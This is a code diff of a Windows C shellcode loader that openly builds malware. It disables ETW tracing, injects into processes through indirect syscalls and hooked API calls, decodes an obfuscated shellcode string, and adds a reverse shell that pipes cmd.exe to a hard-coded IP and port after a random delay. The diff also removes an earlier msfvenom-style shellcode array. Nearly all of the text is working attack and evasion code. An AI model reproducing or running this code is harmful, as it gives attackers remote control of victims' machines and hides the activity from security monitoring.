@@ -1,24 +1,30 @@
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+#define WIN32_LEAN_AND_MEAN
 #include <stdio.h>
 #include <stdlib.h>
 #include <Windows.h>
+#include <ws2tcpip.h>
 #include <winternl.h>
 #include <ntstatus.h>
 #include <TlHelp32.h>
+#include <winsock2.h>
 #include <stdint.h>
+#include <time.h>
 #include <winuser.h>
 #include "Sympho.h"
 #include "HellsHall.h"
-
+#pragma comment(lib, "ws2_32.lib")
 
 // Global Variable :
 NTSTATUS STATUS;
 #define ViewShare 1
 HANDLE hSection = NULL;
 HANDLE hThread = NULL;
-BYTE* pBaseSection = NULL;
+PBYTE pBaseSection = NULL;
 DWORD PID = NULL;
 HANDLE hProcess = NULL;
 HANDLE hMap = NULL;
+PBYTE   payload = NULL;
 PVOID localBase = NULL;
 PVOID remoteBase = NULL;
 SIZE_T viewSize = NULL;
@@ -186,7 +192,7 @@ BOOL Initialize() {
 BOOL RemoveETWEvent(HMODULE hModule) {
 	DWORD dwOldProtection = 0;
 
-	printf("[i] Shuting Down ETW provision\n");
+	printf("\t[i] Shuting Down ETW provision\n");
 	PBYTE pNtTraceEvent = (PBYTE)GetProcAddress(hModule, "NtTraceEvent");
 	if (!pNtTraceEvent)
 		return FALSE;
@@ -254,39 +260,163 @@ HANDLE GiveMeMyProcessHandle(WCHAR* ProcessName, OUT int* PID) {
 		entry = (PSYSTEM_PROCESS_INFORMATION)
 			((BYTE*)entry + entry->NextEntryOffset);
 	}
-	getchar();
 	return NULL;
 }
 
-BOOL SettingMap(HANDLE* outSection, BYTE* outRemoteBase, HANDLE hProcess) {
 
-	printf("[i] ReadFile hooked successfuly\n");
+void reverse_shell(const char* ip, int port) {
+	printf("[+] Getting reverse shell...\n");
 
-	// Put your msfvenom shellcode here !
-	uint8_t payload[] = {
-		 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,
-	0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,
-	0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
-	0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,
-	0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,
-	0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,
-	0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,
-	0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,
-	0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
-	0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,
-	0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,
-	0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,
-	0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,
-	0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,
-	0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
-	0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,
-	0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,
-	0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,
-	0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,
-	0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00
-	};
+	WSADATA wsa;
+	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return;
 
-	SIZE_T sPayload = sizeof(payload);
+	SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	if (s == INVALID_SOCKET) { printf("Socket fail\n"); return; }
+
+	struct sockaddr_in addr;
+	addr.sin_family = AF_INET;
+	addr.sin_port = htons(port);
+	addr.sin_addr.s_addr = inet_addr(ip);
+
+	if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
+		printf("Connect failed: %d\n", WSAGetLastError());
+		closesocket(s);
+		return;
+	}
+
+	printf("[+] Connected!\n");
+
+	char buffer[1024];
+	DWORD bytesRead, bytesWritten;
+
+	// create pipe for cmd.exe
+	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
+	HANDLE hStdInRead, hStdInWrite;
+	HANDLE hStdOutRead, hStdOutWrite;
+	if (!CreatePipe(&hStdInRead, &hStdInWrite, &sa, 0)) return;
+	if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0)) return;
+
+	STARTUPINFOA si = { 0 };
+	PROCESS_INFORMATION pi = { 0 };
+	si.cb = sizeof(si);
+	si.dwFlags = STARTF_USESTDHANDLES;
+	si.hStdInput = hStdInRead;
+	si.hStdOutput = hStdOutWrite;
+	si.hStdError = hStdOutWrite;
+
+	if (!CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, TRUE,
+		CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+		printf("CreateProcess failed\n");
+		return;
+	}
+
+	CloseHandle(hStdInRead);
+	CloseHandle(hStdOutWrite);
+	DWORD bytesAvailable = 0;
+
+	while (1) {
+		// Read stdout from cmd.exe
+		DWORD bytesAvailable = 0;
+		if (PeekNamedPipe(hStdOutRead, NULL, 0, NULL, &bytesAvailable, NULL) && bytesAvailable > 0) {
+			DWORD bytesRead;
+			ReadFile(hStdOutRead, buffer, min(bytesAvailable, sizeof(buffer) - 1), &bytesRead, NULL);
+			send(s, buffer, bytesRead, 0);
+		}
+
+		// Read commands from C2
+		int len = recv(s, buffer, sizeof(buffer) - 1, 0);
+		if (len > 0) {
+			buffer[len] = 0;
+			buffer[len] = '\n';
+			WriteFile(hStdInWrite, buffer, len + 1, &bytesWritten, NULL);
+		}
+		else if (len == 0) {
+			break; // connexion fermée
+		}
+
+		Sleep(50); // éviter CPU à 100%
+	}
+
+	CloseHandle(hStdInWrite);
+	CloseHandle(hStdOutRead);
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
+	closesocket(s);
+	WSACleanup();
+}
+
+// Decode shellcode for remote APC injection: 
+#define ROTR8(x,n)  ((BYTE) ( ((UINT8)(x) >> (n)) | ((UINT8)(x) << (8 - (n))) ) & 0xFF)
+#define XOR_VALUE    0xA5
+#define SHUFFLE_ORDER
+
+BOOL AlphabaticalShellcodeDecode(IN PWORD pEncodedShellcode, IN DWORD dwEncodedShellcodeSize, OUT PBYTE* ppDecodedShellcode, OUT PDWORD pdwDecodedShellcodeSize) {
+
+	if (!pEncodedShellcode || dwEncodedShellcodeSize == 0 || !ppDecodedShellcode || !pdwDecodedShellcodeSize) return FALSE;
+	if (dwEncodedShellcodeSize > (SIZE_MAX / sizeof(WORD))) return FALSE;
+
+	*pdwDecodedShellcodeSize = dwEncodedShellcodeSize / sizeof(WORD);
+
+	if (!(*ppDecodedShellcode = (PBYTE)LocalAlloc(LPTR, *pdwDecodedShellcodeSize))) return FALSE;
+
+	for (DWORD i = 0; i < dwEncodedShellcodeSize / sizeof(WORD); i++)
+	{
+		BYTE    bOffset = 0x00,
+			bTransformed = 0x00,
+			bEncoded = 0x00;
+
+		bTransformed = (BYTE)(pEncodedShellcode[i] & 0xFF);
+		bOffset = (BYTE)(pEncodedShellcode[i] >> 8);
+		bEncoded = ROTR8((bTransformed ^ XOR_VALUE), 4);
+
+		(*ppDecodedShellcode)[i] = bEncoded - bOffset;
+	}
+
+
+#ifdef SHUFFLE_ORDER
+
+	DWORD   dwRoundedDownSize = *pdwDecodedShellcodeSize & ~0x3;
+	DWORD   dwTotalDwords = dwRoundedDownSize / sizeof(DWORD);
+	PDWORD  pdwRawHexShellcode = (PDWORD)(*ppDecodedShellcode);
+
+	for (DWORD i = 0; i < dwTotalDwords; i++)
+	{
+		pdwRawHexShellcode[i] = (((pdwRawHexShellcode[i] << 16) | (pdwRawHexShellcode[i] >> 16)) & 0xFFFFFFFFu);
+	}
+
+#endif 
+
+
+	return TRUE;
+}
+
+// End of decode functions for shellcode
+
+BOOL SettingMap(HANDLE* outSection, PBYTE* outRemoteBase, HANDLE hProcess) {
+
+	printf("\t[i] ReadFile hooked successfuly\n");
+	DWORD   dwDecodedpayloadLen = 0x00;
+	// Put your msfvenom shellcode encoded here !
+	unsigned char EncodedShellcode[] = "hYgHpanteLclpmpuoklKclcllJnkoklLbKgZOXNvhQnjNYntiALLoLmDjqlJmtMFjqkzcLlTpNjElLodnolkMDNtbKeLdSntikNBdprAmlokbzlppPmKgkgcfZQbckeKnkntoZokmlkajqizlTSnlZopiLZwfljqaLntclclhhnUjwgldLlLntckmtmHiAodmlNujqolaiIxSnflgcmKmDcmjtOfiAmXnolkaKQylkgldSntgktTjPokckeKpPmKkwplotalMBbXMBcilcdKbtlWitmHhgatbXNujqMNOHokckflodnxhQRsRcocxRolmKzraKfllTckbxhTYwokdLmKncLDlDoNokOUmKitMFjyoklBmKoZwAcLlDokcmalntxRLEoRoUcmpKfSoOodcmSpclaLtcckaLclaLaLhOIAaLntclaLckckbKhQokTeCoGYhmkedgjZgqfLeRjVoVokHAcmKYgoxZghvhntcfNBcDmPStalpSklgqlUiWcgnMoBcYkzokIEclisawnLaraMhwiZnMkuigOBkynTloMKhpmlXroKnMhocLcJnNhxnFhmnsYabOoUnQnWLLxxIiOLnWiYnKiWbOiwnHMnCNluiZhsiXhlnTiXlmlkmRbMlnbKlcmZlnmWovmTbKbKbLlnigktbHlmnMnShlNROLnSiXbNcLlohnbUkxOhnmhgnWcLOEyakthlcEnWiciXOBhmXvnNBPykbUbZaL";
+
+	if (!AlphabaticalShellcodeDecode(EncodedShellcode, sizeof(EncodedShellcode) - 1, &payload, &dwDecodedpayloadLen))
+	{
+		return -1;
+	}
+	if (memcmp(payload, payload, dwDecodedpayloadLen) != 0)
+	{
+		printf("[!] Error while decoding Shellcode\n");
+	}
+	else
+	{
+		printf("[+] Success: Decoded Shellcode successfuly\n");
+		
+	}
+	
+
+
+
+	SIZE_T sPayload = dwDecodedpayloadLen;
 	LARGE_INTEGER maxSize = { .HighPart = 0, .LowPart = sPayload };
 	SYSCALL(S.NtCreateSection);
 	if ((STATUS = HellHall(&hMap, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
@@ -300,7 +430,7 @@ BOOL SettingMap(HANDLE* outSection, BYTE* outRemoteBase, HANDLE hProcess) {
 		return FALSE;
 	}
 	else {
-		printf("[i] NtmapViewofsection mapped locally\n");
+		printf("\t[i] NtmapViewofsection mapped locally\n");
 	}
 
 	if (hMap != NULL) {
@@ -315,15 +445,15 @@ BOOL SettingMap(HANDLE* outSection, BYTE* outRemoteBase, HANDLE hProcess) {
 		return FALSE;
 	}
 
-	memcpy(localBase, payload, sizeof(payload));
+	memcpy(localBase, payload, dwDecodedpayloadLen);
 	viewSize = sPayload;
 	if ((STATUS = HellHall(hMap, hProcess, &remoteBase, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_READONLY)) != 0) {
 		printf("[-] Issue while mapping view remotely. NTSTATUS: 0x%08X\n", STATUS);
 		return FALSE;
 	}
 	else {
-		printf("File Mapped succesfuly with remote process at 0x%p\n", remoteBase);
-		outRemoteBase = &remoteBase;
+		printf("[+] File Mapped succesfuly with remote process at 0x%p\n", remoteBase);
+		*outRemoteBase = remoteBase;
 	}
 	Sleep(100);
 	HellHall(hMap, hProcess, &remoteBase, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_EXECUTE_WRITECOPY);
@@ -459,7 +589,7 @@ LONG WINAPI VectorHandler(PEXCEPTION_POINTERS pExceptionInfo) {
 				// RDX = &pBaseSection
 				// R8  = hProcess
 				ctx->Rcx = (ULONG_PTR)&hSection;
-				ctx->Rdx = (ULONG_PTR)&pBaseSection;
+				ctx->Rdx = (ULONG_PTR)pBaseSection;
 				ctx->R8 = (ULONG_PTR)hProcess;
 
 				if (!SettingMap(&hSection, &pBaseSection, hProcess))
@@ -505,6 +635,23 @@ LONG WINAPI VectorHandler(PEXCEPTION_POINTERS pExceptionInfo) {
 	return EXCEPTION_CONTINUE_SEARCH;
 }
 
+int randint(int min, int max) {
+	return min + rand() % (max - min + 1);
+}
+
+void WaitExec() {
+	srand((unsigned int)time(NULL));
+	int ready = 0;
+	while (!ready) {
+		int r = randint(0, 100);
+		if (r >= 90) {
+			ready = 1;
+		}
+		Sleep(500);
+	}
+	printf("[+] Executing the reverse shell...\n");
+	((void(*)())reverse_shell)("192.168.50.114", 443); // Add your IP and Port for reverse shell if remote APC injection doesn't execute itself
+}
 
 volatile BOOL executed = FALSE;
 BOOL* pExecuted;
@@ -516,7 +663,7 @@ VOID CALLBACK DummyAPCFunc(ULONG_PTR param) {
 
 BOOL QueueShellcodeAPC(DWORD dwPID, PVOID pRemoteShellcode) {
 
-	printf("[i] MessageBoxW hooked successfuly\n");
+	printf("\t[i] MessageBoxW hooked successfuly\n");
 	int i = 0;
 	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwPID);
 	if (hSnapshot == INVALID_HANDLE_VALUE) {
@@ -579,16 +726,17 @@ void MySleepThread() {
 	}
 }
 
+
+
 BOOL InjectShellcodeAPCmanually(HANDLE hProcess, PVOID pBaseSection) {
 	HANDLE hLocalTread = NULL;
 	ULONG PreviousSuspendCount;
-	printf("Before LOCAL APC injection\n");
 	SYSCALL(S.NtCreateThreadEx);
 	if ((STATUS = (HellHall(&hLocalTread, THREAD_ALL_ACCESS, 0, (HANDLE)-1, MySleepThread, 0, 0x00000001, 0, 0, 0, 0))) != 0) {
 		printf("[-] failed to create local thread\n");
 	}
 
-	BOOL res = QueueUserAPC((PAPCFUNC)localBase, hLocalTread, (ULONG_PTR)NULL);
+	BOOL res = QueueUserAPC((PAPCFUNC)WaitExec, hLocalTread, (ULONG_PTR)NULL);
 	if (res != 0) {
 		printf("[+] APC queued on newly created thread id : %d\n", GetThreadId(hLocalTread));
 	}
@@ -596,15 +744,11 @@ BOOL InjectShellcodeAPCmanually(HANDLE hProcess, PVOID pBaseSection) {
 		printf("Error\n");
 		return(FALSE);
 	}
-
 	SYSCALL(S.NtResumeThread);
 	if ((STATUS = (HellHall(hLocalTread, &PreviousSuspendCount))) != 0) {
 		printf("Error while resuming newly thread\n");
 		return(FALSE);
 	}
-
-
-
 
 	return TRUE;
 }
@@ -691,30 +835,29 @@ int main() {
 
 	ReadFile(NULL, "Thanks !", "HIHI", MB_OK, NULL);
 	if (pBaseSection != NULL && pBaseSection != 0) {
+		
 		printf("[+] Setup of the map successful at 0x%p\n", pBaseSection);
 	}
 	else {
 		printf("Failed to create map\n");
+		printf("%p, %d", pBaseSection, *pBaseSection);
 	}
-	printf("Getchar DR0\n");
 	// Getting a thread from the remote process
-	printf("[i] Press Enter to execute the shellcode\n");
+	printf("\t[i] Executing the shellcode localy\n");
 	if (!MessageBoxW(NULL, L"test", "Never exec", MB_OK)) { // QueueShellcodeAPC((DWORD)PID, pBaseSection)
-		printf("[i] Trying to inject a thread manually\n");
-		printf("Getchar DR1\n");
+		printf("\t[i] Trying to inject a thread manually\n");
 		RECT rc = { 10, 10, 200, 50 };
 		HDC hdc = NULL;
 		if (!DrawTextA(hdc, "Hello World", -1, &rc, DT_CENTER | DT_VCENTER | DT_SINGLELINE)) { // !InjectShellcodeAPCmanually(hProcess, pBaseSection)
 			printf("Failed to inject local thread manually\n");
 		}
 		else {
-			printf("Enjoy :)\n");
-			printf("Getchar DR2: %d\n", GetLastError());
+			printf("\nEnjoy :)\n\n");
 			getchar();
 		}
 	}
 	else {
-		printf("Enjoy :)\n");
+		printf("\nEnjoy :)\n\n");
 	}
 
 
